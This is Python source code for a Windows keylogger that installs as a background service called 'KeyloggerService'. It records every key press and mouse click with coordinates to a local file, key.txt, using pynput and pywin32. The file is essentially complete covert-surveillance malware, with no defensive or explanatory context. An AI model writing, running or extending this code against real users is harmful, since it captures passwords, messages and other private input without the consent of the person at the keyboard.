import os
import sys
import time
import threading
import pythoncom
from pynput import keyboard, mouse
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyloggerService"
    _svc_display_name_ = "Keylogger Service"
    _svc_description_ = "Logs key presses and mouse clicks"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = threading.Event()

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop_event.set()

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def on_press(self, key):
        with open('key.txt', 'a') as f:
            try:
                f.write('Key pressed: {0}\n'.format(key.char))
            except AttributeError:
                f.write('Special key pressed: {0}\n'.format(key))

    def on_click(self, x, y, button, pressed):
        with open('key.txt', 'a') as f:
            f.write('Mouse clicked at ({0}, {1}) with button {2}\n'.format(x, y, button))

    def main(self):
        with keyboard.Listener(on_press=self.on_press) as k_listener, \
             mouse.Listener(on_click=self.on_click) as m_listener:
            k_listener.start()
            m_listener.start()
            while not self.stop_event.is_set():
                time.sleep(1)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(KeyloggerService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(KeyloggerService)
